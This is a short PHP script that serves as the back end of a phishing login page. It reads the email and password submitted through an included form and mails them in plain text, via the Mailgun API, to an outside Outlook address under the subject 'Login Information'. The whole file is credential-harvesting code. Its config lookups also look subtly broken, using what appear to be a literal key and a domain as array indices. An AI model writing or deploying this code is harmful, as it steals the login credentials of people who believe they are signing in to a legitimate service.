<?php

require 'vendor/autoload.php';

use Mailgun\Mailgun;

$config = include 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $mgClient = Mailgun::create($config['5e63e616ce3be04ab046bedce0e56335']);
    $domain = $config['sandbox200e5e5e6ffe412b95ec54b9d213e1f0.mailgun.org'];

    $subject = 'Login Information';
    $message = "Email: $email\nPassword: $password";

    try {
        $result = $mgClient->messages()->send($domain, [
            'from'    => 'postmaster@sandbox1234567890abcdef.mailgun.org',
            'to'      => 'Opal.EphTv.Networks@outlook.com',
            'subject' => $subject,
            'text'    => $message
        ]);
        echo 'Email sent successfully: ' . $result->getId();
    } catch (Exception $e) {
        echo 'Failed to send email. Error: ' . $e->getMessage();
    }
} else {
    echo 'Invalid request. Please use POST method.';
}

include 'form.html';
